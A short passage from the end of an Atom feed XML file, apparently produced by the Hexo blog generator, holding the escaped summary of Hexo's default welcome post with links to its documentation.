    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
